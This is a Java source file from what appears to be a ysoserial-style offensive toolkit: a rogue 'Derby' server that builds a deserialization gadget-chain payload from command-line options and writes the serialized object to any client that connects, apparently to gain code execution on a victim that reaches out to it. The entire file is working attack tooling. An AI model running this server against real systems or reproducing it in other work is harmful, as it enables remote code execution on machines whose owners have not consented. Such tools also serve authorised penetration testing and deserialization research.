package cn.butler.jndi.server;

import cn.butler.yso.Serializer;
import cn.butler.payloads.ObjectPayload;

import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

public class DerbyServer {
    public static int port = 4851;
    public static String gadget;
    public static String payload;

    public static void main(String[] args) throws Exception {
        // 解析命令行参数
        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-h":
                    System.out.println("Usage: java -cp ysoSimple.jar cn.butler.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-a <args>] [-h]");
                    return;
                case "-p":
                    port = Integer.parseInt(args[i + 1]);
                    break;
                case "-g":
                    gadget = args[i + 1];
                    break;
                case "-a":
                    payload = args[i+1];
                    break;
            }
        }

        byte[] data;

        if (gadget != null) {
            Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",gadget, payload);
            data = Serializer.serialize(object);
        } else {
            System.out.println("gadget and args must be specified");
            return;
        }

        // 启动 Derby Server
        System.out.println("[Derby] Listening on " + port);
        try (ServerSocket server = new ServerSocket(port)) {
            try (Socket socket = server.accept()) {
                System.out.println("[Derby] Connection from " + socket.getRemoteSocketAddress().toString().split("/")[1]);
                socket.getOutputStream().write(data);
                socket.getOutputStream().flush();
                Thread.sleep(TimeUnit.SECONDS.toMillis(5));
            }
        }
    }
}
